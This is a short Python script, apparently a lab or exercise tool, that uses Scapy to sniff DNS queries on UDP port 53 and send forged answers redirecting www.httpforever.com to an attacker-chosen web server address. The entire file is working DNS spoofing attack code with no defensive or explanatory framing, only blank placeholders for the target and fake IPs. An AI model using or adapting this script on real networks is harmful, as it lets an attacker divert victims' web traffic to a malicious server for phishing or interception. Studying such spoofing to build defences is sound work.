from scapy.all import *

target_ip = ""  # IP address of the target device
fake_ip = ""   # IP address of your web server

def dns_spoof(pkt):

    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        dns_query = pkt.getlayer(DNS).qd.qname.decode()
        if dns_query == 'www.httpforever.com.':
            print(f"Redirecting {dns_query} to {fake_ip}")
            #fake DNS response
            dns_response = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                           UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                               an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=fake_ip))
            send(dns_response)



# sniffing
sniff(filter="udp port 53", prn=dns_spoof, store=0)

